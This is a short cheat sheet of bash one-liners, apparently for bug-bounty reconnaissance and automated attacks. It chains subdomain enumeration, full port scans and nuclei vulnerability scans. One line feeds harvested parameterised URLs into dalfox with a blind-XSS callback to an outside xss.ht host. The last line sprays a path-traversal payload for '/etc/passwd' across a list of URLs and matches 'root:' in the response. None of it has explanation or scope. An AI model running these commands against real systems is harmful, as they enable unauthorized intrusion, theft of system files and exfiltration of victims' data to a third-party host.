# Automation Command

```bash
amass intel -cidr 127.0.0.1/21 | subfinder -silent -all -o subdo.txt | rustscan -a subdo.txt -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates
```

```bash
cat target.com | gau -subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind username.xss.ht
```

```bash
rustscan -a 'hosts.txt' -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates/
```

```bash
httpx -l urls.txt -pa -o url_ips.txt

cat urls_ips.txt | grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' > ips.txt

httpx -l ips.txt -ports - -o ips_ports.txt

nuclei -l ips_ports.txt -t nuclei-templates/
```

```bash
httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
```
